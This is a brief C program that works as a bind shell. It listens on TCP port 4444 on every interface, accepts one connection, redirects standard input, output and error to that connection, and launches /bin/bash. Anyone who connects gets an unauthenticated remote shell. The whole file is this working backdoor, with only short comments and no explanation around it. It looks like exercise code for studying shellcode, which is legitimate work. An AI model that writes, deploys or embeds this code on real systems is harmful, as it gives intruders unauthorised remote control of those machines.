#include <netinet/ip.h>

int main() {
    int server_socket_fd, client_socket_fd, size_client_socket_struct;
    struct sockaddr_in server_address, client_address;

    // create a TCP socket
    server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(4444);

    // bind the socket to 0.0.0.0:4444
    bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));

    // passive socket that listens for connections
    listen(server_socket_fd, 1);

    // accept incoming connection
    size_client_socket_struct = sizeof(struct sockaddr_in);
    client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);

    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    system("/bin/bash");
}
